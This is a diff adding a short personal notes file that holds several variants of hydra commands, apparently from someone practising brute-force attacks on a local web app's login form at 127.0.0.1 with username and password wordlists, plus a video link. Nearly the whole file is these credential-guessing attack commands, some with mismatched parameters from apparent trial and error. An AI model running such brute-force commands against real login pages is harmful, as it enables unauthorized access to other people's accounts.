@@ -1,0 +1,31 @@
+  127.0.0.1
+127.0.0.1127.0.0.1
+
+/home/imon/hacker
+
+hydra -L user.txt -P pass.txt\
+> 127.0.0.1:5000\
+> http-post-form\               
+> "/login: username=^USER^&password=^PASS^:Invalid credentials" 
+
+hydra -L user.txt -P pass.txt\
+> 127.0.0.1\     
+> http-post-form\ 
+> '/: Username=^USER^&Password=^PASS^:Invalid credentials' 
+
+
+hydra -L /home/imon/hacker/user.txt -P /home/imon/hacker/pass.txt\
+> 127.0.0.1\
+> http-post-form\ 
+> "/login: Username=^username^&Password=^password^:Invalid credentials" 
+
+hydra -V -l user.txt -P pass.txt 127.0.0.1 http-post-form '/:Username=^USER^&Password=^PASS^:Invalid credentials'
+
+
+
+sudo hydra -L user.txt -P pass.txt -u -f 127.0.0.1 -s 5000 http-post-form '/login:Username=^USER^&Password=^PASS^:Invalid credentials'   
+
+sudo hydra -L user.txt -P pass.txt -u -f 127.0.0.1 -s 5000 http-post-form '/login:username=^USER^&password=^PASS^:Invalid credentials'
+
+
+https://youtu.be/BsminzrQKHQ?si=w1A22Be3Z4rIhK0S
